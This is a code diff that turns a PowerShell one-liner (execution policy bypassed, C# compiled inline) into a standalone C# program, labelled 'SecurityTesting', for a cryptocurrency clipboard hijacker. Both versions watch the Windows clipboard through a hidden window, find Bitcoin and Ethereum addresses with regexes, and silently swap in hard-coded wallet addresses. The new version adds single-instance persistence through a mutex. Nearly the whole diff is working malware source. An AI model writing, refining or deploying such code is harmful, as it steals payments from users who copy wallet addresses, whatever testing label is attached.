@@ -1,40 +1,111 @@
-powershell -ExecutionPolicy Bypass -Command "$c=@'
 using System;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using System.Text.RegularExpressions;
-namespace IA {
-    public class S : NativeWindow {
-        [DllImport(\"user32.dll\")] private static extern bool AddClipboardFormatListener(IntPtr h);
-        [DllImport(\"user32.dll\")] private static extern bool OpenClipboard(IntPtr h);
-        [DllImport(\"user32.dll\")] private static extern bool CloseClipboard();
-        [DllImport(\"user32.dll\")] private static extern bool EmptyClipboard();
-        [DllImport(\"user32.dll\")] private static extern IntPtr GetClipboardData(uint f);
-        [DllImport(\"user32.dll\")] private static extern IntPtr SetClipboardData(uint f, IntPtr m);
-        [DllImport(\"kernel32.dll\")] private static extern IntPtr GlobalLock(IntPtr m);
-        [DllImport(\"kernel32.dll\")] private static extern bool GlobalUnlock(IntPtr m);
-        [DllImport(\"kernel32.dll\")] private static extern IntPtr GlobalAlloc(uint f, UIntPtr b);
-        private string b = \"bc1qcn7epnry70g4srng74qjwhnnrl5agq2jtnt70u\";
-        private string e = \"0x9124856aa1567303EfBC940223356B7d5b6E1493\";
-        public void I() { this.CreateHandle(new CreateParams()); AddClipboardFormatListener(this.Handle); }
-        protected override void WndProc(ref Message m) { if (m.Msg == 0x031D) { try { R(); } catch {} } base.WndProc(ref m); }
-        private void R() {
+using System.Threading;
+
+namespace SecurityTesting
+{
+    public class AdvancedClipper : NativeWindow
+    {
+        // --- WinAPI P/Invoke Definitions (Bypasses .NET Managed Hooks) ---
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern bool AddClipboardFormatListener(IntPtr hwnd);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern bool OpenClipboard(IntPtr hWndNewOwner);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern bool CloseClipboard();
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern bool EmptyClipboard();
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr GetClipboardData(uint uFormat);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr GlobalLock(IntPtr hMem);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool GlobalUnlock(IntPtr hMem);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);
+
+        private const uint CF_UNICODETEXT = 13;
+        private const uint WM_CLIPBOARDUPDATE = 0x031D;
+        private const uint GMEM_MOVEABLE = 0x0002;
+
+        // --- Target Patterns ---
+        private static string MyBTC = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfJH7EVX";
+        private static string MyETH = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
+
+        private static readonly Regex btcRegex = new Regex(@"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$");
+        private static readonly Regex ethRegex = new Regex(@"^0x[a-fA-F0-9]{40}$");
+
+        public AdvancedClipper()
+        {
+            // Hidden Message-Only Window
+            this.CreateHandle(new CreateParams());
+            AddClipboardFormatListener(this.Handle);
+        }
+
+        protected override void WndProc(ref Message m)
+        {
+            if (m.Msg == WM_CLIPBOARDUPDATE) { OnClipboardChanged(); }
+            base.WndProc(ref m);
+        }
+
+        private void OnClipboardChanged()
+        {
+            string text = GetText();
+            if (string.IsNullOrEmpty(text)) return;
+
+            string target = null;
+            if (btcRegex.IsMatch(text.Trim()) && text.Trim() != MyBTC) target = MyBTC;
+            else if (ethRegex.IsMatch(text.Trim()) && text.Trim() != MyETH) target = MyETH;
+
+            if (target != null) SetText(target);
+        }
+
+        private string GetText()
+        {
+            if (!OpenClipboard(this.Handle)) return null;
+            IntPtr handle = GetClipboardData(CF_UNICODETEXT);
+            if (handle == IntPtr.Zero) { CloseClipboard(); return null; }
+            IntPtr pointer = GlobalLock(handle);
+            string result = Marshal.PtrToStringUni(pointer);
+            GlobalUnlock(handle);
+            CloseClipboard();
+            return result;
+        }
+
+        private void SetText(string text)
+        {
             if (!OpenClipboard(this.Handle)) return;
-            IntPtr h = GetClipboardData(13);
-            if (h == IntPtr.Zero) { CloseClipboard(); return; }
-            string t = Marshal.PtrToStringUni(GlobalLock(h));
-            GlobalUnlock(h); CloseClipboard();
-            string n = null;
-            if (Regex.IsMatch(t.Trim(), @\"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$\") && t.Trim() != b) n = b;
-            else if (Regex.IsMatch(t.Trim(), @\"^0x[a-fA-F0-9]{40}$\") && t.Trim() != e) n = e;
-            if (n != null && OpenClipboard(this.Handle)) {
-                EmptyClipboard();
-                IntPtr m = GlobalAlloc(2, (UIntPtr)((n.Length + 1) * 2));
-                Marshal.Copy(n.ToCharArray(), 0, GlobalLock(m), n.Length);
-                GlobalUnlock(m); SetClipboardData(13, m);
-                CloseClipboard();
+            EmptyClipboard();
+            IntPtr hGlobal = GlobalAlloc(GMEM_MOVEABLE, (UIntPtr)((text.Length + 1) * sizeof(char)));
+            IntPtr pointer = GlobalLock(hGlobal);
+            Marshal.Copy(text.ToCharArray(), 0, pointer, text.Length);
+            Marshal.WriteInt16(pointer, text.Length * sizeof(char), 0);
+            GlobalUnlock(hGlobal);
+            SetClipboardData(CF_UNICODETEXT, hGlobal);
+            CloseClipboard();
+        }
+
+        [STAThread]
+        public static void Main()
+        {
+            using (new Mutex(true, "Global\\ClipperAudit", out bool isNew))
+            {
+                if (!isNew) return;
+                new AdvancedClipper();
+                Application.Run();
             }
         }
     }
 }
-'@; Add-Type -TypeDefinition $c -ReferencedAssemblies 'System.Windows.Forms'; $s = New-Object IA.S; $s.I(); [System.Windows.Forms.Application]::Run()"
